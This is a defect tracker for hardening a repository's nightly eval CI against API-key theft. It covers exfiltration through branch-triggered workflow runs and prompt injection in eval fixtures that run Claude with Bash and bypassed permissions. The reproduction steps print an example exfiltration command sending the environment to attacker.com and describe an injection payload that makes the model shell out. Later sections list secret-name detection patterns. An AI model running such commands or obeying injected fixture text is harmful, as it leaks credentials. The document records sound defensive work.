---
name: "Eval workflow hardening — F1 secret-exfil ingress + F3 prompt-injection RCE (one trust-boundary fix, Approach C)"
type: defect
id: "D000023"
status: active
created: "2026-05-17"
updated: "2026-05-17"
repo: "jcl2018/claude-skills-templates"
branch: "claude/festive-borg-d10844"
blocked_by: ""
---

<!-- Note (post-v2.2): new defects use the freestanding-file convention
     at work-items/defects/<domain>/D<NNN>_bug-report.md (no work-item
     dir wrapper). This template is retained for legacy defects
     (D000001-D000018) which use the older D<NNN>_<slug>/ dir pattern.
     D000019-D000023 continue the dir pattern (TRACKER+RCA+test-plan)
     to match the manifest's 3-artifact defect contract and recent
     practice. See skills/CJ_personal-workflow/WORKFLOW.md. -->

## Lifecycle

### Phase 1: Track

1. Document reproduction steps in the Log section
2. Create working branch: `git checkout -b fix/{slug}`
3. Scaffold required docs:
   - `RCA.md` (root cause analysis) — from `templates/doc-RCA.md`
   - `test-plan.md` (regression test plan) — from `templates/doc-test-plan.md`
4. Run `/investigate` to diagnose root cause
   → produces investigation findings in Log + Insights
5. Log initial symptoms and hypotheses

**Gates:**
- [x] Reproduction steps documented
- [x] Working branch created (`branch` field populated)
- [x] Required docs scaffolded (RCA + test-plan)
- [x] Root cause identified (or best hypothesis logged)

### Phase 2: Implement

1. Work from `/office-hours` design doc (if applicable) + root cause analysis
   → design doc at `~/.gstack/projects/{slug}/`
2. Implement fix based on root cause analysis
3. Write regression test covering the defect scenario
4. Commit fix and test together
5. Update RCA doc with final root cause

**Gates:**
- [ ] Fix committed
- [x] RCA doc updated
- [x] Todos section reflects remaining work (no stale items)

### Phase 3: Ship

1. Run `/CJ_personal-workflow check` — verify no regressions
2. Verify test-plan: regression test scenarios passing
3. Run `/ship` — creates fix PR (includes pre-landing code review)
4. Run `/land-and-deploy` — merges and verifies fix in production

❌ If regression test fails: investigate further
❌ If CI fails: fix, push, re-run `/ship`

**Gates:**
- [ ] `/CJ_personal-workflow check` — validation passed
- [ ] Test-plan verified (regression scenarios passing)
- [ ] `/ship` — PR created
- [ ] `/land-and-deploy` — merged and deployed

## Reproduction Steps

<!-- Steps to reproduce the defect. Include environment details. -->

**F1 — secret-exfil ingress via `workflow_dispatch` from non-main refs:**

1. Note `.github/workflows/eval-nightly.yml` declares `workflow_dispatch` and places `ANTHROPIC_API_KEY` in the job-level `env:` (line ~73).
2. As any actor with write access: `gh workflow run eval-nightly.yml --ref <any-branch>`.
3. That ref's `scripts/eval.sh` / `tests/eval/lib/run-case.sh` runs with the live secret in env.
4. **Observe:** a malicious branch can `curl -d @<(env) attacker.com` — log-masking does not stop an attacker who controls the executing code.

**F3 — prompt-injection RCE in eval case fixtures:**

1. `tests/eval/lib/run-case.sh` (~94-105) spawns `claude -p --permission-mode bypassPermissions --allowedTools "Bash,Read,Glob,Grep"` with prompt+fixture from the trusted `tests/eval/<skill>/<case>/` tree.
2. Add a case (via commit) whose prompt contains an injection payload that shells out.
3. The selective scrub (`run-case.sh:80-92`) deliberately KEEPS `ANTHROPIC_API_KEY` in env.
4. **Observe:** the model's Bash tool obeys the payload and can exfiltrate the key from env.

**Environment:** GitHub Actions `ubuntu-latest`; public repo `jcl2018/claude-skills-templates`; `ANTHROPIC_API_KEY` is a long-lived Anthropic repo secret.

## Todos

<!-- Actionable items for this defect fix. -->

- [x] **F1 (atomic unit — Approach C, cutover order matters, no-gap ENG-7/T3):**
  - [x] (i) **FIRST** — branch-aware pre-check: shipped in the secretless `eval-structure` job ("Verify claude CLI + secretless precondition (branch-aware pre-check, T3/ENG-7)") — off `main` warns-not-fails, proceeds secretless. Same commit removes the old unconditional job-level `env:`, so no commit leaves a non-`main` `key-with-old-env` window.
  - [x] (ii) protected Environment `eval-secrets` + deployment-branch rule → `main`: **operator step documented** in the `eval-nightly.yml` "Cutover order" comment block (out-of-band GitHub UI; coordinate with F000013 nightly-CI secret-set blocker owner). Workflow file is in its leak-window-free final state regardless.
  - [x] (iii) `eval` job declares `environment: eval-secrets` + `if: github.ref == 'refs/heads/main'` (belt); step-scoped `env: ANTHROPIC_API_KEY` on the 2 steps that need it, surfaced via the job's Environment binding.
  - [x] (iv) old job-level `env: ANTHROPIC_API_KEY` reference deleted (same commit).
- [x] **T2:** permanent non-`main` adversarial probe is the FIRST step of `eval-structure` ("Adversarial secretless probe (T2 / Q2 — permanent, runs before everything)"); fails CI if any `^ANTHROPIC`/`*_API_KEY/_TOKEN/_SECRET` is visible on a non-`main` ref. Ordered before structure validation and before the old-`env:` deletion.
- [x] **F3 (run-case.sh):**
  - [x] deleted the `ANTHROPIC_API_KEY`-preservation special-case (old denylist block + apologetic comment removed).
  - [x] scrub via `env -i` / explicit allowlist (`EVAL_ENV_ALLOWLIST`) on the untrusted path; scheduled-`main` (`GITHUB_REF==refs/heads/main`) keeps env auth.
  - [x] fail-closed post-assert: aborts non-zero with a clear message if the inherited env contains any `^ANTHROPIC` / `*_API_KEY/_TOKEN/_SECRET` var (allowlisted non-secrets excluded) on the untrusted path. (Asserts on the *inherited* env per ENG-4's plant-test contract — see journal `[impl-finding]`.)
  - [x] plant-test fixture `tests/eval/lib/plant-test.sh` — plants `ANTHROPIC_API_KEY`, an unenumerated `FOO_API_KEY`, and a `*_TOKEN`; asserts the case aborts before spawning claude. **Runs green** (zero API cost; wired into `eval-structure`).
- [x] **TODOS.md follow-up rows (rows only, NO code this work-item):** added SEC-1 (npm-postinstall key exposure), F11 (full GITHUB_STEP_SUMMARY markdown sanitization), F12 (`actions/upload-artifact@v4 if: failure()`); `~~strikethrough~~`-exclusion left OFF (active backlog); parent "Eval workflow hardening" row PARTIAL-annotated. Each cross-references D000023 as split origin.
- [ ] (Phase 3 / post-ship) Verify the scheduled `main` nightly still runs the real API eval green (SC2 — structurally post-ship, not pre-merge QA; route to a manual `main` dispatch after merge).

## Log

<!-- Chronological entries with dates and commit SHAs. -->

- 2026-05-17: Created. Eval CI hardening — closes the two HIGH findings (F1 secret-exfil ingress, F3 prompt-injection RCE) from the v2.0.7 `/ship` pre-landing review of `S000025_nightly_ci`. Scaffolded from APPROVED design doc `chjiang-claude-festive-borg-d10844-design-20260517-123955.md` (GATE #1: Approach C, approved with overrides T2/T3-ENG-7/F1-atomicity/allowlist-scrub). Scope = F1+F3 only; SEC-1/F11/F12 deferred to tracked TODOS rows.
- 2026-05-17: Implemented (Approach C). `.github/workflows/eval-nightly.yml` split into `eval-structure` (secretless, always; T2 probe first + branch-aware pre-check + plant-test + secretless structure validation) and `eval` (real API, `needs: eval-structure`, `if: github.ref=='refs/heads/main'`, `environment: eval-secrets`, no job-level secret `env:`, step-scoped secret on the 2 steps that need it). `tests/eval/lib/run-case.sh` — removed the `ANTHROPIC_API_KEY`-preservation denylist; added `env -i`/allowlist scrub + fail-closed inherited-env assert (scheduled-`main` keeps env auth). Added `tests/eval/lib/plant-test.sh` (passes — proves the assert fires before spawn for ANTHROPIC_API_KEY + unenumerated *_API_KEY + *_TOKEN). TODOS.md: parent row PARTIAL-annotated; SEC-1/F11/F12 added as active rows. Pre-merge QA green; SC2 (scheduled-main real eval) is structurally post-ship.

## PRs

<!-- PR links with status (open/merged/closed). -->

## Files

<!-- Affected file paths. -->

- `.github/workflows/eval-nightly.yml` (modified — F1 atomic unit: split into secretless `eval-structure` + main-only `eval`; T2 permanent probe; branch-aware pre-check; old job-level secret `env:` removed)
- `tests/eval/lib/run-case.sh` (modified — F3: removed `ANTHROPIC_API_KEY`-preservation denylist; `env -i`/allowlist scrub + fail-closed inherited-env post-assert; scheduled-`main` keeps env auth)
- `tests/eval/lib/plant-test.sh` (NEW — F3 plant-test; `tests/eval/lib/` is skipped by `scripts/eval.sh` case discovery so it is a regression harness, not an eval case; wired into the `eval-structure` job, zero API cost)
- `TODOS.md` (modified — parent "Eval workflow hardening" row PARTIAL-annotated; SEC-1 + F11 + F12 added as dedicated active follow-up rows, rows only / no code)

## Insights

<!-- Root cause analysis, patterns discovered, related defects. -->

- **One root cause, two enforcement points (Premise 1 + 4):** a long-lived Anthropic credential is reachable from attacker-influenced execution. F1 = ref-controlled code execution (Actions trust-gating); F3 = model-controlled tool execution (Claude auth-delivery + scrub). Fixing only one leaves the other exploitable.
- **GATE #1 promoted Approach C from fallback to primary:** both the autoplan Codex voice and the independent Claude pass concluded Q1 criterion (iii) is essentially unsatisfiable on a single-UID hosted runner (`apiKeyHelper` is a same-UID-re-runnable script; `~/.claude/.credentials.json` is same-UID readable; no Linux OS keychain; read-once-file is TOCTOU vs the model's first Bash turn). Approach A's auth-delivery spike resolves to C anyway → C is implemented directly, NO spike step.
- **F1 is an ATOMIC unit, NOT decomposable** (ENG-1, conf 9/10). `eval-nightly.yml`'s `exit 1`-on-empty-key is unconditional; shipping (Environment+job-binding) without the branch-aware pre-check regresses non-`main` `workflow_dispatch` (it would hard-fail at the pre-check). The branch-aware pre-check (T3/ENG-7) ships FIRST in the cutover order.
- **ENG-7 calibration (Codex-superior, adopted):** strict step ordering eliminates the no-key OUTAGE but introduces a deliberate `key-with-old-env` LEAK window unless the old `env:` is gated behind `if: main` as the FIRST sub-step. Recommended remediation (2) adopted.
- **Residual risk (Non-goals):** V1 does NOT close same-UID recovery via files / `/proc` / open FDs / loopback helper. The fail-closed assert (SC3) is env-surface only; the probe test (SC5) is defense-in-depth, not a structural-impossibility claim. The only V1 control with structural teeth vs. a merged-to-`main` malicious case is F1's environment + main-gating. Full structural closure = Approach B (tracked V2 ideal follow-up).

## Journal

<!-- Structured entries from the work-track journal command. Each entry has a type
     (decision, finding, blocker) and a Summary field. -->

- [decision] 2026-05-17 — Implementation path = Approach C (secretless-by-default, key only on scheduled `main` via a protected GitHub Environment). Approach A rejected as primary at autoplan GATE #1 (its spike resolves to C; criterion (iii) unsatisfiable single-UID). Summary: implement C + Success Criteria 1-8 + Next Steps cutover order; ignore Approach A except for lineage.
- [decision] 2026-05-17 — F1 ships as one ATOMIC unit; branch-aware pre-check (T3/ENG-7) is the FIRST cutover sub-step. Summary: no commit in the series may leave a non-`main` `key-with-old-env` window; old `env:` gated behind `if: main` before the protected Environment is wired.
- [decision] 2026-05-17 — F3 scrub = `env -i` / explicit allowlist + fail-closed post-assert (`^ANTHROPIC` OR `_API_KEY|_TOKEN|_SECRET`) + plant-test fixture. Summary: NOT a broadened denylist (fails open); the plant-test proves the assert fires so it can't silently regress.
- [decision] 2026-05-17 — T2: permanent non-`main` adversarial probe job step, ordered before the irreversible old-`env:` deletion. Summary: permanent CI (not a one-time manual check) so a future Environment-rule regression fails CI rather than going silent.
- [decision] 2026-05-17 — Scope = F1+F3 only. SEC-1 (npm-postinstall key exposure), F11 (full markdown sanitization), F12 (`upload-artifact if: failure()`) deferred as tracked TODOS.md rows (rows only, no code), `~~strikethrough~~`-exclusion left OFF, cross-referencing D000023. Summary: same minimal-scope discipline as the confirmed F1+F3-only decision; Approach B is the tracked V2 ideal.
- [finding] 2026-05-17 — SC2 (scheduled `main` nightly still green) is structurally POST-SHIP — the protected Environment releases to `main` only by design, so it is unverifiable from a PR branch. Summary: test-plan classifies SC2 as post-ship; route to a manual `main` dispatch after merge, NOT pre-merge QA (TODOS.md:147 pattern).
- [impl-decision] 2026-05-17 — Job-structure choice (design left to SPEC): used the **split-job** form (`eval-structure` secretless + main-only `eval`) over an `if:`-guarded single job. Rationale: it most cleanly expresses Approach C (non-`main` runs ONLY the secretless job; the secret-bearing job is structurally absent off `main`, not merely `if:`-skipped), keeps all existing hardening comments, and gives the T2 probe + plant-test a natural secretless home. Both forms were design-endorsed; this is the more legible one.
- [impl-decision] 2026-05-17 — Single-PR cutover: the workflow file's final state is leak-window-free by construction (one atomic file write removes the old job-level `env:` AND adds the branch-aware pre-check + Environment binding in the same commit). The ENG-7/T3 ordering is encoded as an explicit "Cutover order (no-gap)" operator comment block for the out-of-band GitHub-Environment creation step (the Environment itself is created in the GitHub UI, not in-repo). No commit leaves a non-`main` `key-with-old-env` window nor a scheduled-`main` no-key window.
- [impl-finding] 2026-05-17 — The fail-closed F3 assert MUST grep the **inherited** env (pre-`env -i`), not the post-scrub env. First implementation asserted on the scrubbed env; the mandated plant-test (ENG-4: "plant ANTHROPIC_FOO=bar, assert the case aborts") caught it as fail-OPEN — an allowlist `env -i` makes the scrubbed env definitionally clean, so a planted var never reaches it and the assert was vacuous + untestable. Corrected to: on the untrusted path, abort if ANY `^ANTHROPIC`/`*_API_KEY/_TOKEN/_SECRET` var is present in the inherited env (allowlisted non-secrets excluded). Plant-test now passes for all three planted vars. This is the exact "plant-test catches silent regression" value the design mandates.
- [impl-finding] 2026-05-17 — Plant-test harness needed a non-empty `fixture/` — `run-case.sh` runs `seed-fixture.sh` (which `git commit`s) BEFORE the scrub block; an empty fixture made the commit fail ("nothing to commit") and the case aborted at the seed, never reaching the assert. Added a seed file so the plant-test actually exercises the assert under test.
- [impl] 2026-05-17 — Wrote 1 new file (`tests/eval/lib/plant-test.sh`), modified 3 (`.github/workflows/eval-nightly.yml`, `tests/eval/lib/run-case.sh`, `TODOS.md`), created the work-item tree (TRACKER/RCA/test-plan). Verified: `bash -n` clean on both scripts, `eval-nightly.yml` YAML parses (2 jobs, correct needs/if/environment, no job-level secret env on either job), plant-test PASSES (3/3 planted vars abort before spawn), trusted-`main` path smoke keeps env auth + does not fire the assert. 6 journal entries added; Phase 2 implementer-owned gates (`RCA doc updated`, `Todos section reflects remaining work`) transitioned. `Fix committed` left for `/ship` (commit-owned).
- [impl-auto] 2026-05-17 — Auto-equivalent run (dispatched by /CJ_personal-pipeline Step 5.3; no AUQ surface). No sensitive-surface per the skill's Step 6.4 family (catalog/manifests/workflow-templates/validators/git-hooks) — eval-nightly.yml + run-case.sh are CI/eval-harness security surfaces but outside that AUQ family; no pre-collected AUQ was required.
- [impl-pass] D000023: implementation complete. Phase 2 implementer-owned gates transitioned.
- 2026-05-17 [qa-smoke] 1 (F3 fail-closed assert / plant-test): green — `bash tests/eval/lib/plant-test.sh` exit 0; aborts non-zero via the fail-closed assert before spawning the (stubbed) claude for all 3 planted vars.
- 2026-05-17 [qa-smoke] 2 (F3 allowlist not denylist): green — old `unset GITHUB_TOKEN...` denylist + apologetic `ANTHROPIC_API_KEY`-preservation comment removed; `EVAL_ENV_ALLOWLIST` + `env -i $scrubbed_assignments` spawn present.
- 2026-05-17 [qa-smoke] 3 (F3 negative probe — no ANTHROPIC* in case env): green — untrusted-path spawn uses `env -i` (inherited env incl. ANTHROPIC* discarded); defense-in-depth per Non-goals (not a structural-impossibility claim).
- 2026-05-17 [qa-smoke] 4 (F1 branch-aware pre-check ships FIRST, no-gap): green — branch-aware pre-check present in `eval-structure`; no job-level secret `env:` on either job (old unconditional `env:` removed in same commit); "Cutover order (ENG-7/T3)" no-gap narrative documented.
- 2026-05-17 [qa-smoke] 5 (F1 Environment binding is the access control): green — `eval` job `environment: eval-secrets` + `if: github.ref == 'refs/heads/main'`; no residual unconditional job-level `env:` secret reference.
- 2026-05-17 [qa-smoke] 6 (T2 permanent non-`main` adversarial probe, correctly ordered): green — probe is step[0] of `eval-structure` (before structure validation + before old-`env:` removal); `eval-structure` has no Environment binding; probe exits 1 (fails CI) on a non-`main` leak (permanent CI assertion, not a one-time check).
- 2026-05-17 [qa-smoke] 7 (TODOS SEC-1/F11/F12 rows, cross-ref D000023, no code): green — 3 active (non-`~~strikethrough~~`) rows, each cross-referencing D000023; no `actions/upload-artifact` step and no `--ignore-scripts` on any npm line (the only `--ignore-scripts` occurrence is inside the SEC-1 deferral *comment*, which is correct per SC7). Parent "Eval workflow hardening" row PARTIAL-annotated. (Initial QA grep raised an over-broad false positive on the comment string; re-verified code-vs-comment → green.)
- 2026-05-17 [qa-smoke-manual] 8 (SC2 scheduled-`main` real API eval): pending human verification — structurally POST-SHIP. The protected Environment `eval-secrets` releases to `main` only by design, so the real API eval suite is unverifiable from a PR branch. Verify post-merge via a manual `main` dispatch (`gh workflow run eval-nightly.yml --ref main`) or the next scheduled run (TODOS.md:147 pattern).
- 2026-05-17 [qa-smoke] 9 (repo health): green — `./scripts/validate.sh` exit 0 (Errors: 0, Warnings: 0); `/CJ_personal-workflow check` on the D000023 dir green (no MISSING/DRIFT).
- 2026-05-17 [qa-smoke-summary] green: 8/8 non-manual rows green (1 manual row pending — SC2 post-ship). Defect type: test-plan rows are the verification layer; no E2E phase (qa.md type dispatch).
- 2026-05-17 [qa-pass] D000023 (defect): green smoke from test-plan rows (9 rows; 8 automated/inspection green, 1 manual-pending post-ship SC2). No qa-owned Phase 2 gates per `tracker-defect.md`; Phase 3 `Test-plan verified` gate awaits `/ship`-time inference. `Fix committed` remains commit-owned (deferred to `/ship`, post-pipeline — per the pipeline design + implement.md Step 10 defect contract; matches D000022/D000019 precedent).
- 2026-05-17 [auto-pipeline-clean] /CJ_personal-pipeline run 20260517-132629-51307 (--suppress-final-gate): 1 mechanical decision (Step 4 scaffold-shape-confirm), 0 taste, 0 user-challenge-approved. Phases scaffold→implement→QA all green; post-scaffold/post-implement/post-QA boundary checks green; validate.sh exit 0. end_state=green. Wrapper (/CJ_goal_run) consumes the decision log at ~/.gstack/analytics/CJ_personal-pipeline-auto-decisions.jsonl (filter run_id=20260517-132629-51307).
